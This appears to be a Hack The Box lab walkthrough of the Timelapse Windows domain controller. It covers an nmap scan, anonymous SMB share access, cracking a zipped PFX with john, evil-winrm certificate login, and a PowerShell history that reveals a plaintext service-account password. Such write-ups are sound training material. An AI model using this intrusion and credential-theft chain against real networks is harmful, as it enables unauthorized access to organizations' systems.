# Active HTB



## Enumeration

```bash
# Nmap 7.94 scan initiated Tue Jul 11 22:33:58 2023 as: nmap -sCV -p53,88,135,139,389,445,464,5
93,636,3268,3269,5986,9389,49667,49673,49674,49696,58940 -oN enumeration/Scanned 10.10.11.152  
Nmap scan report for 10.10.11.152                                                              
Host is up (0.20s latency).                                                                    

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-07-12 11:34:21Z
)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.ht
b0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.ht
b0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2023-07-12T11:35:54+00:00; +8h00m15s from scanner time.
|_http-title: Not Found 
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
58940/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-12T11:35:18
|_  start_date: N/A
|_clock-skew: mean: 8h00m14s, deviation: 0s, median: 8h00m14s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 11 22:35:44 2023 -- 1 IP address (1 host up) scanned in 105.48 seconds
```

We have the port 5986 to perform remote connection but with ssl
cipher


Searching for information about smb service


```bash
❯ smbclient -L 10.10.11.152 -N
Can't load /etc/samba/smb.conf - run testparm to debug it

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Viewing information in the shares folder

```bash
❯ smbclient  //10.10.11.152/Shares -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 10:39:15 2021
  ..                                  D        0  Mon Oct 25 10:39:15 2021
  Dev                                 D        0  Mon Oct 25 14:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021

                6367231 blocks of size 4096. 1278691 blocks available
smb: \> cd Dev
smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 14:40:06 2021
  ..                                  D        0  Mon Oct 25 14:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021

                6367231 blocks of size 4096. 1278541 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
smb: \Dev\>
```

Getting the .zip file, we can't unzip it, because it is protected
with password. Let's try to cracking with john the ripper



Converting .zip file to hash with zip2john to hash

```bash
zip2john winrm_backup.zip > content/hash

  ~/Desktop/HTB/TimeElapse ❯ cd content

❯ john --wordlist=/usr/share/wordlists/Passwords/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2023-07-11 22:46) 2.631g/s 9140Kp/s 9140Kc/s 9140KC/s surfrox1391..supergau
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```


As we see in the nmap content, we need to try to connect to the service using ssl connection

```bash
❯ john --wordlist=/usr/share/wordlists/Passwords/rockyou.txt pfx.john

thuglegacy
```


```bash
❯ evil-winrm -i 10.10.11.152 -c /home/evilload/Desktop/HTB/TimeElapse/content/cert.pem -k /home/evilload/Desktop/HTB/TimeElapse/content/key.pem -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```



getting the history

```powershell
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```



